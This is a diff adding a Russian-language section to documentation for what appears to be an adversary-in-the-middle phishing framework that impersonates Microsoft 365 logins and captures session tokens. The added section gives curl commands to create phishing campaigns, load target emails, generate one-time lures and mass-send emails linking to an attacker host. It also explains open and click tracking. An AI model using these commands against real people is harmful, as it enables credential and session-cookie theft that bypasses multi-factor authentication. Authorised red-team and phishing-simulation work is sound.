@@ -67,3 +67,17 @@ curl -X POST .../api/v1/lures -d '{"path":"/l/op01","phishlet_id":"microsoft365"
    `capture.token` на ESTSAUTH/ESTSAUTHPERSISTENT.
 6. В отчет: скрин сломанного (если есть) + красные URL из DevTools +
    значение `captures` до/после + куда увел финальный редирект.
+
+## 8. Кампании (менеджер рассылок)
+```sh
+# создать + цели + запуск (персональные one-time lures):
+curl -X POST .../api/v1/campaigns -d '{"name":"q3","phishlet_id":"microsoft365"}' # -> id
+curl -X POST .../api/v1/campaigns/ID/targets -d '{"emails":["a@corp.test"]}'
+curl -X POST .../api/v1/campaigns/ID/launch  # -> [{email, lure}]
+# рассылка (SMTP_* env; без SMTP_LIVE=1 — dry-run, письма не уйдут):
+curl -X POST .../api/v1/campaigns/ID/send -d '{"subject":"IT: {{.Email}}","body":"<a href=\"{{.URL}}\">go</a>","url_base":"https://m365.evil.example.com"}'
+```
+Трекинг: пиксель `/__tr/o?tid=` (open), редирект `/__tr/c?tid=&to=/l/..`
+(click), submit приписывается автоматом по пути приманки. Статистика —
+`GET /api/v1/campaigns` или меню Campaigns. Либо все то же в TUI:
+Campaign+ (название, фишлет, emails, subject, body, url_base) одним заходом.
